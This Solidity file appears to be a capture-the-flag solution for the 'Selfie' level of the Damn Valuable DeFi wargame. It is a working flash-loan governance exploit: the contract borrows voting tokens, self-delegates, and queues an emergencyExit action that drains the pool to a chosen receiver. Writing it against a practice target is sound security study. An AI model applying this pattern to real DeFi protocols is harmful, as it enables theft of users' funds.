// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";

contract Attack {
    DamnValuableVotes public immutable VOTING_TOKEN;
    SimpleGovernance public immutable GOVERNANCE;
    SelfiePool public immutable POOL;

    uint256 public actionId;

    constructor(DamnValuableVotes _votingToken, SimpleGovernance _governance, SelfiePool _pool) {
        VOTING_TOKEN = _votingToken;
        GOVERNANCE = _governance;
        POOL = _pool;
    }

    function attack(uint256 _amount, address _receiver) external {
        POOL.flashLoan(IERC3156FlashBorrower(address(this)), address(VOTING_TOKEN), _amount, abi.encode(_receiver));
    }

    function executeCall() external {
        GOVERNANCE.executeAction(actionId);
    }

    function onFlashLoan(address, address, uint256 _amount, uint256, bytes calldata _data) external returns (bytes32) {
        (address receiver) = abi.decode(_data, (address));
        VOTING_TOKEN.delegate(address(this));
        actionId = GOVERNANCE.queueAction(address(POOL), 0, abi.encodeCall(POOL.emergencyExit, (receiver)));
        VOTING_TOKEN.approve(msg.sender, _amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}